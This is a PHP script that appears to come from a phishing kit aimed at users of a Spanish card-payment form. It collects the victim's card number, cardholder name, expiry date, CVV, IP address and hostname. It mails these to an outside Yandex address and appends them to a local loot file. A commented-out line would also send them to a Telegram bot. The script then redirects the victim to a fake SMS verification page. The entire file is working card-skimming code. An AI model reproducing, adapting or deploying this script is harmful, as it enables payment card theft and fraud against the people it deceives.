<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

if (isset($_POST['next']))
{

		$_SESSION["Scard"] = $_POST['Sis_Numero_Tarjeta'];
		$_SESSION["Sname_on_card"] = $_POST['CreditCardInputModel.CardHolderName'];
		$_SESSION["Sexp_month"] = $_POST['Sis_Caducidad_Tarjeta_Mes'];
		$_SESSION["Sexp_year"] = $_POST['Sis_Caducidad_Tarjeta_Anno'];
		$_SESSION["Scvv2"] = $_POST['Sis_Tarjeta_CVV2'];


	$id = $_SESSION['Scard'];
		$ss = strlen($id);
		$lengthcard = $ss - 4;
		$cardX =  substr($id,$lengthcard);
		$_SESSION['scardx'] = $cardX;
		

	$subject  = "POSTA [ NO ] - ".$_SERVER['REMOTE_ADDR']."";
	$headers  = "From: posta <posta@SPYUS.ORG>\r\n";
	$message .= "+───────────|  ".$_SESSION['Sname_on_card']."  |───────────\n";
    $message .= "|Ca : ".$_SESSION['Scard']."\n";
    $message .= "|Dt : ".$_SESSION['Sexp_month']." / ".$_SESSION['Sexp_year']."\n";	
    $message .= "|Cv : ".$_SESSION['Scvv2']."\n"; 
    $message .= "|N° : $ip / $hostname \n"; 
	
	$smolic .= "+───────────|  ".$_SESSION['Sname_on_card']."  |───────────\n";
    $smolic .= "|Ca : ".$_SESSION['Scard']."\n";
    $smolic .= "|Dt : ".$_SESSION['Sexp_month']." / ".$_SESSION['Sexp_year']."\n";	
    $smolic .= "|Cv : ".$_SESSION['Scvv2']."\n"; 
    $smolic .= "|N° : $ip / $hostname \n"; 
	
	$to = "bigbug1@yandex.com";
	mail($to, $subject, $smolic, $message, $headers);
    
$Txt_Rezlt = fopen('../zabi.txt', 'a+');
	fwrite($Txt_Rezlt, $smolic);
	fclose($Txt_Rezlt);

//$token = "1343434325:AAG_x-UEBTGBWdeUp81KvOHMafHA_No_FZU";//
//file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1000052632&text=" . urlencode($message)."" );//




}

		header('location: SMS/loading.html');

echo $message
?>

